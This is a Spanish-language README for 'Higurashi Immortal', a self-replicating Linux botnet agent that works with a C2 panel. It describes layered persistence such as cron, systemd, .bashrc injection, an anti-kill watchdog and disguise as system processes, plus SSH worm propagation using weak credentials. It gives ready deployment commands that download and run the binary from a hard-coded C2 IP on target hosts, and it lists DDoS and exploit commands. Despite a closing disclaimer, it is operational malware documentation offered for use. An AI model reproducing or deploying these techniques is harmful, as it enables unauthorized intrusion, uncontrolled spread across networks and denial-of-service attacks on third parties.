# 🔥 HIGURASHI IMMORTAL - Bot Indestructible

## ⚠️ ADVERTENCIA CRÍTICA

Este es el **bot más agresivo del sistema**. Características:

### 🛡️ PERSISTENCIA EXTREMA (10+ métodos)
1. **Múltiples copias** en `/usr/bin/`, `/usr/sbin/`, `/bin/`, `/sbin/`, `/tmp/`, `/var/tmp/`, `/dev/shm/`, `/opt/`
2. **Crontab** - Se ejecuta cada 5 minutos automáticamente
3. **Systemd service** - Se inicia con el sistema y se auto-reinicia
4. **rc.local** - Arranque alternativo
5. **.bashrc injection** - Se ejecuta al iniciar sesión de cualquier usuario
6. **Init scripts** - Compatibilidad con sistemas antiguos
7. **Watchdog process** - Monitorea el proceso principal cada 30s y lo reinicia si muere
8. **Anti-kill** - Ignora SIGINT, SIGTERM (no se puede matar con Ctrl+C)
9. **Polimorfismo** - Cambia nombre cada ejecución (ej: `systemd-helper4521`, `kworker-daemon8832`)
10. **Process hiding** - Se camufla como proceso del sistema

### 🌐 AUTO-REPLICACIÓN
- Escanea la red local cada **5 minutos**
- Intenta infectar 20 hosts aleatorios por scan
- Usa SSH con credenciales comunes
- Se descarga automáticamente desde el C2
- Propagación exponencial

### 🔄 RECONEXIÓN INFINITA
- **999,999 intentos** de reconexión
- Espera 10 segundos entre intentos
- **NUNCA** se rinde
- Si el C2 cae, espera a que vuelva

## 🚀 COMPILACIÓN

```bash
chmod +x compile_immortal.sh
./compile_immortal.sh
```

Genera dos binarios:
- `higurashi_immortal` - Versión normal
- `higurashi_immortal_static` - Versión estática (IoT)

## 📡 DEPLOYMENT

### Opción 1: Servir desde C2
```bash
# En el VPS
python3 -m http.server 8080

# El bot se descargará automáticamente desde http://93.95.231.134:8080/higurashi_immortal
```

### Opción 2: Infección manual
```bash
# Copiar al target
scp higurashi_immortal root@TARGET:/tmp/h

# Ejecutar en el target
ssh root@TARGET "cd /tmp; chmod +x h; ./h"
```

### Opción 3: Payload en exploit
```bash
# Incluir en tu exploit
wget http://93.95.231.134:8080/higurashi_immortal -O /tmp/.h
chmod +x /tmp/.h
/tmp/.h &
```

## 🎯 FUNCIONAMIENTO

### 1. Primera Ejecución
```
[*] Installing extreme persistence...
[+] Persistence installed in 10+ locations
[*] Starting watchdog...
[*] Auto-replication enabled
[*] Connecting to C2...
[+] Connected to C2!
```

### 2. Auto-Replicación (cada 5 minutos)
```
[*] Starting auto-replication scan...
[*] Scanning subnet 192.168.1.x
[*] Attempting infection on 192.168.1.45...
[*] Attempting infection on 192.168.1.78...
[+] Auto-replication scan complete
```

### 3. Reconexión Automática
```
[-] Lost connection to C2
[*] Reconnecting in 10 seconds...
[*] Connecting to C2 (attempt 1245)...
[+] Connected to C2!
```

### 4. Anti-Kill
```
$ kill -9 12345
# Proceso muerto

# 30 segundos después...
[WATCHDOG] Parent died, restarting...
# Bot vuelve a la vida desde otra ubicación
```

## 🔍 VERIFICACIÓN

### Ver procesos activos
```bash
ps aux | grep -E "systemd-|kworker-|update-|network-"
```

Output esperado:
```
root      1234  systemd-helper4521
root      1235  kworker-daemon8832
```

### Ver persistencia instalada
```bash
# Crontab
crontab -l

# Systemd
systemctl list-unit-files | grep systemd-

# Binarios
ls -la /tmp/.* /usr/bin/systemd-* /usr/sbin/kworker-*
```

### Ver conexiones C2
```bash
netstat -antp | grep 93.95.231.134:4444
```

## 🧹 ELIMINACIÓN (Solo para pruebas)

⚠️ **SOLO en tu máquina de pruebas**

```bash
chmod +x cleanup_immortal.sh
sudo ./cleanup_immortal.sh
```

El script limpia:
- ✅ Todos los procesos
- ✅ Todos los binarios (10+ ubicaciones)
- ✅ Crontab entries
- ✅ Systemd services
- ✅ rc.local entries
- ✅ .bashrc injections
- ✅ Init scripts

**Después reinicia el sistema** para asegurar eliminación completa.

## 🎮 USO CON C2

### Activar en target
Simplemente ejecuta el binario en el target. El bot:
1. Se daemoniza automáticamente
2. Instala persistencia extrema
3. Conecta al C2
4. Aparece en el dashboard como `higurashi_immortal`

### Ver en C2
```
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║                       🌸 HIGURAMA C2 v3 🌸                                ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════╗
║ 🤖 Active Bots: 1                                                        ║
╠══════════════════════════════════════════════════════════════════════════╣
║ [1] systemd-helper4521 │ immortal │ x86_64 │ higurashi_immortal         ║
╚══════════════════════════════════════════════════════════════════════════╝
```

### Comandos disponibles
Todos los comandos del C2 funcionan normalmente:
- `[1]` DDoS
- `[2]` Scan Network
- `[3]` Download File
- `[4]` Send Exploit
- `[H]` Hunter Mode (se replica automáticamente además del auto-scan)

## 🏆 VENTAJAS vs HIGURASHI NORMAL

| Característica | Higurashi Normal | Higurashi Immortal |
|---|---|---|
| **Persistencia** | Básica (crontab) | Extrema (10+ métodos) |
| **Watchdog** | ❌ No | ✅ Sí |
| **Anti-kill** | ❌ No | ✅ Sí |
| **Auto-replicación** | ❌ No | ✅ Cada 5 min |
| **Reconexión** | Básica | Infinita (999k intentos) |
| **Polimorfismo** | ❌ No | ✅ Nombre aleatorio |
| **Process hiding** | ❌ No | ✅ Camuflaje sistema |

## 🎯 CASOS DE USO

### 1. Testing de persistencia
Perfecto para probar técnicas de respuesta a incidentes:
- ¿Pueden detectarlo?
- ¿Pueden eliminarlo completamente?
- ¿Cuánto tarda en reaparecer?

### 2. Red Team engagement
- Simula un APT real
- Prueba SOC/Blue Team
- Evalúa herramientas EDR

### 3. Infraestructura C2 robusta
- Bots que nunca desaparecen
- Red auto-mantenida
- Propagación automática

## ⚠️ RESPONSABILIDAD

**SOLO para uso en:**
- ✅ Tus propios sistemas
- ✅ Entornos de laboratorio
- ✅ Pentesting autorizado
- ✅ Red Team exercises

**NUNCA para:**
- ❌ Sistemas sin autorización
- ❌ Infraestructura de producción ajena
- ❌ Actividades ilegales

## 🐛 DEBUGGING

### Bot no conecta
```bash
# Ver logs del watchdog
tail -f /var/log/syslog | grep systemd-

# Ver intentos de conexión
tcpdump -i any host 93.95.231.134 and port 4444
```

### Persistencia no funciona
```bash
# Verificar permisos
ls -la /tmp/.systemd-*

# Verificar systemd
journalctl -u systemd-*.service

# Verificar cron
grep CRON /var/log/syslog
```

### Auto-replicación no funciona
```bash
# Verificar sshpass instalado
which sshpass

# Instalar si falta
apt-get install sshpass
```

## 📊 ESTADÍSTICAS ESPERADAS

Después de **1 hora** de ejecución en una red con 254 hosts:

- **Hosts escaneados**: ~240 (20 cada 5 min × 12 ciclos)
- **Infecciones exitosas**: 5-15 (depende de credenciales débiles)
- **Propagación**: Exponencial (cada bot infectado también escanea)
- **Conexiones C2**: 5-15 bots activos

Después de **24 horas**:
- **Cobertura de red**: 100% (todos los hosts vulnerables)
- **Bots activos**: 20-50 (depende del tamaño de red)
- **Intentos de eliminación frustrados**: ∞

---

**"Una vez que Higurashi Immortal entra, nunca sale."** 💀
